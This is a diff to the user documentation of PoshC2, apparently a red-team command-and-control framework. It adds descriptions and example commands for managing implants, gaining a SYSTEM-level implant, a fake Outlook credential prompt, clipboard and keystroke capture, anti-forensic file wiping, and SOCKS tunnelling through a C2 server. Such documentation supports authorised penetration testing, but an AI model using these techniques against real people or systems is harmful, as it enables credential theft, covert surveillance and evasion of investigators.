@@ -105,10 +105,18 @@ Hide-Implant
 ##############
 The ``Hide-Implant`` command is a partner to the above, Kill-Implant command. The reason for this command is the situation may arise where an implant may become disconnected or stale and there is no way to interact with it or to kill it. This command simply removes it from the list of implants to avoid possible confusion.
 
+.. code-block:: python
+
+	Hide-Implant
+
 Unhide-Implant
 ################
 This does the reverse of the Hide-Implant, it re-adds any hidden implants into the active implant list.
 
+.. code-block:: python
+
+	Unhide-Implant
+	
 ListModules
 ###############
 The ``ListModules`` command allows the user to view the Powershell modules that reside in the modules folder, within the PoshC2 folder tree. We have provided quiet a few Powershell modules that most of you will recognise such as Mimikatz and PowerUp, and some you will not have seen before. One of the nice features of PoshC2 is the ability for the user to create their own Powershell modules and use them within PoshC2. Simply copy the modules you want into the modules folder and you'll be able to load them into a running implant with the 'LoadModule' command, which is discussed further in this documentation.
@@ -210,8 +218,6 @@ By default, this will create a new Bat file, standalone executable, 64bit DLL, 3
 
 .. embed:: https://www.youtube.com/watch?v=QzXnM7Vefzc
 
-By default, this will create a new Bat file, standalone executable, 64bit DLL, 32bit DLL and Shellcode. The user and password parameters are optional and can be blank if needed. 
-
 Get-Proxy
 ##########
 Here we provide a command that simply reports the IP address (if any) of the proxy server that the host implant is running on. This command gets the value from the user registry hive, ``HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings``
@@ -267,21 +273,33 @@ Get-Pid
 #########
 Returns the process ID of the implant from the database. This command does not go to the implant to retrieve this information:
 
+.. code-block:: python
+
 	Get-Pid
 
 Get-System
 ############
-This is not an privilege escalation checking function, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user. 
+This is not an privilege escalation technique, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user level. 
+
+.. code-block:: python
+
+	Get-System
 
 Get-System-WithProxy
 #####################
+This is not an privilege escalation technique, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user level. This takes the "proxypayload" that will have been generated using CreateProxyPayload rather than a direct connection. 
+
 .. code-block:: python
 
+	Get-System-WithProxy
  	
 Get-System-WithDaisy
 #########################
+This is not an privilege escalation technique, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user level. This takes the "daisypayload" that will have been generated using Invoke-DaisyChain rather than a direct connection. 
+
 .. code-block:: python
 
+	Get-System-WithDaisy
  	
 Get-ImplantWorkingDirectory
 #############################
@@ -293,7 +311,7 @@ Returns the implant working directory from the database. This command does not g
 
 Posh-Delete 
 ############
-This function createt a block of bytes in memory full of random content and overwrites the file with this before removing from disk. This option will help prevent forensic investigations against files that have been dropped to disk during the engagement, therefore is more OpSec aware. Please be aware this may take time on larger files. 
+This function creates a block of bytes in memory full of random content and overwrites the file with this before removing from disk. This option will help prevent forensic investigations against files that have been dropped to disk during the engagement, therefore is more OpSec aware. Please be aware this may take time on larger files. 
 
 .. code-block:: python
 
@@ -357,47 +375,66 @@ This function will loop through the active desktop windows and try to capture a 
 
 Cred-Popper
 #########################
+This uses the Powershell to launch a Windows login prompt that pre-populates the users username and domain and asks that "Outlook" requires their credentials. This can be edited but it does not allow this on the command line. This then returns the entered credentials via the C2 channel. 
+
 .. code-block:: python
 
  	Cred-Popper
 
 Get-Clipboard
 #########################
+This uses "windows.forms.clipboard" to retrieve whatever value is in the clipboard, this could be used to capture passwords that have been copied and pasted. 
+
 .. code-block:: python
 
  	Get-Clipboard
 
 Get-AllFirewallRules
 #########################
+Using the COM object "HNetCfg.FwPolicy2" this retrieves the rules and dumps the information to CSV is supplied as a parameter. If no parameter is supplied it will show the results on screen. 
+
 .. code-block:: python
 
  	Get-AllFirewallRules C:\temp\rules.csv
 
 Get-AllServices
 #########################
+Using native Powershell this iteritively searches through "HKLM:\System\CurrentControlSet\services" to pull out the ImagePath and Description fields for all Windows services. 
+
 .. code-block:: python
 
  	Get-AllServices
 
 SocksProxy / SharpSocks
 #########################
+One of the most important tools for a Red Teamer is the SOCKS Proxy. This enables the creation of a tunnel between two machines such that any network traffic forwarded through it appears to have originated from the machine at the end of it. Once a foothold has been gained on a machine, a SOCKS proxy can be deployed between the operators machines and the target in order to access subnets, machines and services that would not normally be directly accessible. This includes being able to RDP to another machine or even to browse the corporate intranet.
+
+SOCKS support is built into most modern browsers and cURL. However, to use tools like rdesktop or nmap, proxychains on Linux can be used to tunnel the traffic. In order to simulate ProxyChains when using Windows, software such as ProxyCap (http://www.proxycap.com/) can be used.
+
+Previously, if a SOCKS was required then another implant, such as Meterpreter, would have to be deployed in order to provide the ability to tunnel TCP traffic into the internal network. We arrived at the decision that deploying a full implant just for SOCKS support is overkill and while e.g. Meterpreter is very good, it is also can be noisy and is not an appropriate representation of most sophisticated threat actors TTPs. Since PoshC2 is our publicly available C2, we wanted to add this ability for the wider world too, just like we have in our internal tooling.
+
+To deploy SharpSocks use the following command within PoshC2. This also has its own stand-alone module but has been integrated into PoshC2 to work seamlessly. Ensure you have fully configured your C2 proxy to forward traffic back to this host. 
+
 .. code-block:: python
 
  	SharpSocks -Uri http://www.c2.com:9090 -Beacon 2000 -Insecure
 
+.. embed:: https://www.youtube.com/watch?v=-p_hAgmM90k
+
 Get-Keystrokes
 #################
-Although this is an external module created in PowerShellMafia, we have changed the function to be in memory and not touch disk. `Get-Keystrokes.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1>`_
+Although this is an external module initially created in PowerShellMafia, we have changed the function to be in memory and not touch disk. `Get-Keystrokes.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1>`_
 
 .. code-block:: python
 
  	Get-Keystrokes
 
-By default the keylogger will run for 60 minutes and to obtain the output you must run::
+By default the keylogger will run for 60 minutes and to obtain the keylog output you must run:
 
 .. code-block:: python
 
- 	Get-KeystrokesData. 
- 
+ 	Get-KeystrokesData
+
+
 
 
